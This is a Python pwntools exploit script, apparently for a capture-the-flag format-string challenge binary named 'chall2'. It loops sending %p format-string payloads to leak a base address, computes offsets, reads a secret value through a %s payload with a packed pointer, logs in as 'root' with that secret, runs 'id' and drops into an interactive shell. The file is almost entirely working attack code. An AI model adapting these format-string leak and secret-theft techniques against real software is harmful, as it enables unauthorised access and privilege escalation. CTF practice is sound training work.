from pwn import *
from ctypes import *

elf=context.binary=ELF('./chall2')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level='debug'

def GDB():     
    import os
    script = '''
    #!/bin/sh

    cd /mnt/d/file/training/pwn/FMT
    '''
    script += f'gdb -p {io.pid} -x /tmp/command.gdb'
    with open('/tmp/script.sh', 'w') as f: f.write(script)
    os.system("chmod +x /tmp/script.sh")

    cmd = '''
    '''
    with open('/tmp/command.gdb', 'w') as f: f.write(cmd)
    q = process(f'cmd.exe /c start C:\\Windows\\system32\\wsl.exe /tmp/script.sh'.split())
    #input()

#GDB()
while True:
    try:
        io=process('./chall2')
        io.sendline(b'1')
        io.sendline(b'%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_')
        io.sendline(b'1')
        io.sendline(b'2')
        io.sendline(b'%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_')
        io.sendline(b'1')
        io.sendline(b'3')

        io.recvuntil(b'_')
        leak=io.recvline().strip(b'\n').split(b'_')
        leak=int(leak[9], 16)- 0x141d
        log.info('leak ' + hex(leak))

        random=leak+0x0000000000004110
        target=leak+0x00000000000040E0

        io.sendline(b'1')
        io.sendline(p64(random))
        io.sendline(b'%c%c%c%c%c%c_%s')

        io.sendline(b'2')
        io.sendline(p64(random))
        io.sendline(b'%c%c%c%c%c%c_%s')
        io.sendline(b'3')
        io.recvuntil(b'_')
        leak=io.recvline().strip(b'\n')
        print(leak)
        if len(leak) == 47:
            io.sendline(b'2')
            io.sendline(b'root')
            io.sendline(leak)
            io.sendline(b'4')
            log.success("pwned!!!")
            io.sendline(b'id')
            io.interactive()
            break
        else:
            io.close()
    except:
        continue